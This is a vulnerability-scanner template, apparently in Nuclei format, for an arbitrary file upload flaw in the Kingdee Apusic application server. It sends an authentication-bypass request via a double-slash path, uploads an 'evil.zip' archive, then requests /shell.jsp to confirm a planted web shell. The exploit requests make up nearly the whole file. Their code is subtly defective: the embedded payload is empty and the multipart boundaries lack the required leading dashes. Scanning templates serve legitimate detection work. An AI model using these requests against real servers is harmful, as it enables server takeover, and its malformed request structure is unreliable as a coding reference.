id: kingdee-apusic-deployapp-file-upload
info:
  name: Kingdee Apusic Application Server deployApp Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Kingdee Apusic application server's deployApp interface has an arbitrary file upload vulnerability. Attackers can bypass authentication using double slashes and upload malicious compressed packages to take over server permissions.
  tags: file-upload
  reference:
    - http://www.kingdee.com

variables:
  boundary: "----WebKitFormBoundaryd9acIBdVuqKWDJbd"
  hexPayload: "{{hex_decode('')}}"

http:
  - raw:
      - |
        POST /admin//protect/application/deployApp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary={{boundary}}

        {{boundary}}\r\nContent-Disposition: form-data; name="appName"\r\n\r\n111\r\n{{boundary}}\r\nContent-Disposition: form-data; name="deployInServer"\r\n\r\nfalse\r\n{{boundary}}\r\nContent-Disposition: form-data; name="clientFile"; filename="evil.zip"\r\nContent-Type: application/x-zip-compressed\r\n\r\n{{hexPayload}}\r\n{{boundary}}--\r\n
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

  - raw:
      - |
        GET /shell.jsp HTTP/1.1
        Host: {{Hostname}}
      
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "e165421110ba03099a1c0393373c5b43"
        part: body
